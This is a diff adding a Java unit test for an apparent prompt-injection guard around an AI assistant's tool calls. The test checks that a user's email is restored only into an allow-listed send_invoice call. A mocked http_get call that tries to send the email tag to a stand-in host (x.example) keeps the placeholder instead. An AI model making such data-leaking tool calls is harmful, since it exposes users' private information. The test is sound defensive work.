@@ -169,6 +169,27 @@ class PromptShieldAdvisorInjectionTest {
     }
 
     @Test
+    void onlyAllowedToolsReceiveRestoredArgumentsEvenWithoutDetection() {
+        String tag = emailTag();
+        AssistantMessage modelOutput = AssistantMessage.builder().content("")
+                .toolCalls(List.of(
+                        new AssistantMessage.ToolCall("c1", "function", "send_invoice", "{\"to\":\"" + tag + "\"}"),
+                        new AssistantMessage.ToolCall("c2", "function", "http_get", "{\"url\":\"https://x.example/?e=" + tag + "\"}")))
+                .build();
+        CallAdvisorChain chain = mock(CallAdvisorChain.class);
+        when(chain.nextCall(any())).thenReturn(response(modelOutput));
+        InjectionGuard guard = new InjectionGuard(new HeuristicInjectionDetector(), InjectionAction.MONITOR, InjectionAction.MONITOR);
+        PromptShieldAdvisor advisor = new PromptShieldAdvisor(engine, 0, true, true, null, true, true,
+                new PromptShieldAdvisor.InjectionOptions(guard, true, false, true, java.util.Set.of("send_invoice")));
+
+        List<AssistantMessage.ToolCall> calls = advisor.adviseCall(request(new Prompt(toolTurn("{\"temp\":17}"))), chain)
+                .chatResponse().getResult().getOutput().getToolCalls();
+
+        assertEquals("{\"to\":\"juan@example.com\"}", calls.get(0).arguments());
+        assertTrue(calls.get(1).arguments().contains(tag), calls.get(1).arguments());
+    }
+
+    @Test
     void poisonedToolDescriptionIsBlocked() {
         ToolCallback poisoned = new ToolCallback() {
             @Override
